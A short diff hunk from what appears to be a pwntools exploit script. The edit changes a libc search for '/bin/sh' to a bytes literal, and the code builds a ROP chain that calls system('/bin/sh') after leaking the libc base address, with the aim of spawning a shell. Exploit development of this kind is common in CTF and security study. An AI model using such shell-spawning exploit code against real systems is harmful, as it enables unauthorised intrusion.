@@ -70,7 +70,7 @@ def main():
     log.success(f"libc base address: {hex(libc.address)}")
 
     rop = ROP(libc)
-    rop.system(next(libc.search("/bin/sh\x00")))
+    rop.system(next(libc.search(b"/bin/sh\x00")))
     
     print(rop.dump())
 
